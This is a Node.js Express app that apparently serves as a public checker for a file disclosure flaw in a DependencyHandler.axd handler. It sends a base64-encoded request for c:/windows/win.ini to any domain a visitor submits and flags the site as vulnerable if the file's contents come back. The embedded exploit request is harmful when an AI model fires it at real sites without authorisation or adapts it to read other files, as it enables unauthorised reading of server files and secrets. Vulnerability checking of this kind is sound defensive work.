var express = require('express');
var request = require('request');
var bodyParser = require('body-parser');
var moment = require('moment');
var app = express();

app.use(bodyParser.urlencoded({ extended: false }));

app.get('/', function(req, res){
  res.sendFile(__dirname + '/index.html');
});

app.post('/', function(req, res){

  var domain = req.body.domain.toLowerCase();
  var targetFile = new Buffer("file://c:/windows/win.ini").toString('base64');
  var exploitUrl = ('/DependencyHandler.axd?s={0}&t=Css').replace('{0}', targetFile);

  var vulnerable = 'unknown';
  var ip = req.headers['x-forwarded-for'] ? req.headers['x-forwarded-for'].split(' ')[1] : req.connection.remoteAddress;

  if(domain.indexOf('http://') === -1 && domain.indexOf('https://') === -1){
    domain = 'http://' + domain.replace('/', '');
  }

  console.log(moment().toISOString(), 'Domain tested:', ip, domain);

  try {
    // check 1 - windows hosts file
    request({
      uri: domain + exploitUrl,
      headers: {
        "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.111 Safari/537.36"
      }
    }, function (error, response, body) {
      if (!error && response.statusCode == 200) {
        if (body.indexOf('16-bit') > -1){
          console.log(moment().toISOString(), 'Domain vulnerable:', ip, domain);
          vulnerable = 'true';
        } else {
          vulnerable = 'false';
        }
      }

      if(!error && response.statusCode == 404)
      {
        vulnerable = 'false';
      }

      if(error){
        console.log(moment().toISOString(), 'Request error:', error);
      }

      res.json({vulnerable: vulnerable});

    });
  } catch (err){
    console.log(moment().toISOString(), err);
    res.sendFile(__dirname + '/index.html');
  }

});

var server = app.listen((process.env.PORT || 5000), function(){
  var host = server.address().address
  var port = server.address().port

  console.log('Example app listening at http://%s:%s', host, port)
});
